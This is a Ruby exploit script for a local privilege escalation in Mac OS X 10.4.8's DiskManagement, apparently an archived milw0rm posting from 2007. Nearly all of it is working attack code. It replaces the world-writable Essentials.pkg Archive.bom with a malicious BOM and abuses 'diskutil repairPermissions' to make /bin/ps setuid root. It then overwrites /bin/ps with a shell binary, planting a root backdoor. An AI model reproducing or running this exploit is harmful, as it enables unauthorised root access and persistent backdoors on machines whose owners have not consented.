<html><head><title>Mac OS X 10.4.8 DiskManagement BOM Local Privilege Escalation Exploit</title></head><pre>#!/usr/bin/ruby
# (c) 2006 LMH &lt;lmh [at] info-pull.com&gt;
#          Kevin Finisterre &lt;kf_lists [at] digitalmunition.com&gt;
#
# Thanks to The French Connection for bringing this in-the-wild 0-day to
# our attention. If /tmp/ps2 exists on your system, you've been pwned already.
# Thanks to the original authors of the exploit ('meow'). You know who you are.
#
# &quot;They did it for the lulz&quot;   - A Fakecure spokesperson on the 'Mother Of all Bombs'.
# &quot;kcoc kcus I ro tcarter uoY&quot; - The Original Drama P3dobear (Kumo' n').
#

require 'fileutils'

# Basic configuration
TARGET_BINARY       = &quot;/bin/ps&quot;   # Changing this requires you to create a new TEH_EVIL_BOM
TARGET_BACKUP_PATH  = &quot;/tmp/ps2&quot;  # see: &quot;man lsbom&quot; and &quot;man mkbom&quot;
TARGET_SHELL_PATH   = &quot;/usr/bin/id&quot;  # Ensure the binary doesn't drop privileges!
BOMARCHIVE_PATH     = &quot;/Library/Receipts/Essentials.pkg/Contents/Archive.bom&quot;
DISKUTIL_PATH       = &quot;/usr/sbin/diskutil&quot;
TEH_EVIL_BOM        = File.read(&quot;Evil.bom&quot;)

#
# Repair a rogue installation using the back-up files. Useful for testing.
# Probably you don't want to repair on real pwnage... :-)
#
def do_repair()
  puts &quot;++ Repairing (moving back-ups to original path)&quot;
  puts &quot;++ #{File.basename(BOMARCHIVE_PATH)}&quot;
  FileUtils.rm_f BOMARCHIVE_PATH
  FileUtils.cp File.join(&quot;/tmp&quot;, File.basename(BOMARCHIVE_PATH)), BOMARCHIVE_PATH
  
  puts &quot;++ #{TARGET_BINARY}&quot;
  FileUtils.rm_f TARGET_BINARY
  FileUtils.cp TARGET_BACKUP_PATH, TARGET_BINARY
  
  puts &quot;++ Removing back-ups...&quot;
  FileUtils.rm_f TARGET_BACKUP_PATH
  FileUtils.rm_f File.join(&quot;/tmp&quot;, File.basename(BOMARCHIVE_PATH))
  
  puts &quot;++ Done. Repairing disk permissions...&quot;
  exec &quot;#{DISKUTIL_PATH} repairPermissions /&quot;
end

#
# Ovewrite TARGET_BINARY with TARGET_SHELL_PATH and set the rogue permissions unless
# they are already properly set.
#
def exploit_bomb()
  puts &quot;++ We get signal. Overwriting #{TARGET_BINARY} with #{TARGET_SHELL_PATH}.&quot;

  # Overwriting with this method will always work well if binary at TARGET_SHELL_PATH
  # is bigger than TARGET_BINARY (ex. /bin/sh is 1068844 bytes and /bin/ps is 68432).
  # An alternative method is running diskutil again to set the rogue permissions.
  over = File.new(TARGET_BINARY, &quot;w&quot;)
  over.write(File.read(TARGET_SHELL_PATH))
  over.close
  
  unless FileTest.setuid?(TARGET_BINARY)
    fork do
      FileUtils.rm_f TARGET_BINARY
      FileUtils.cp TARGET_SHELL_PATH, TARGET_BINARY
      exec &quot;#{DISKUTIL_PATH} repairPermissions /&quot;
    end
    Process.wait
  end
  
  puts &quot;++ Done. Happy ruuting.&quot;
end

#
# Overwrite the BOM with the rogue version, set new permissions.
#
def set_up_the_bomb()
  puts &quot;++ Preparing to overwrite (#{BOMARCHIVE_PATH})&quot;
  
  # Back-up the original Archive.bom, set mode to 777
  if FileTest.writable?(BOMARCHIVE_PATH)
    backup_path = File.join(&quot;/tmp&quot;, File.basename(BOMARCHIVE_PATH))
    
    unless FileTest.exists?(backup_path)
      puts &quot;++ Creating backup copy at #{backup_path}&quot;
      FileUtils.cp BOMARCHIVE_PATH, backup_path
    end
  
    puts &quot;++ Removing original file.&quot;
    FileUtils.rm_f BOMARCHIVE_PATH
    
    puts &quot;++ Writing backdoor BOM file.&quot;
    target_bom = File.new(BOMARCHIVE_PATH, &quot;w&quot;)
    target_bom.write(TEH_EVIL_BOM)
    target_bom.close
    puts &quot;++ Done.&quot;
  else
    puts &quot;-- Can't write to '#{BOMARCHIVE_PATH}. No pwnage for you today.&quot;
    exit
  end
  
  # Back-up the target backdoor path
  unless FileTest.exists?(TARGET_BACKUP_PATH)
    puts &quot;++ Creating backup copy of #{TARGET_BINARY} at #{TARGET_BACKUP_PATH}&quot;
    FileUtils.cp TARGET_BINARY, TARGET_BACKUP_PATH
  end
  
  # Let diskutil do it's job (set permissions over target binary path, setuid)
  puts &quot;++ Running diskutil to set the new permissions for the backdoor...&quot;
  fork do
    exec &quot;#{DISKUTIL_PATH} repairPermissions /&quot;
  end
  Process.wait
  
  puts &quot;++ Somebody set up us the bomb!&quot;
  exploit_bomb()
end

# Here be pwnies
if ARGV[0] == &quot;repair&quot;
  do_repair()
else
  set_up_the_bomb()
end

# milw0rm.com [2007-01-05]</pre></html>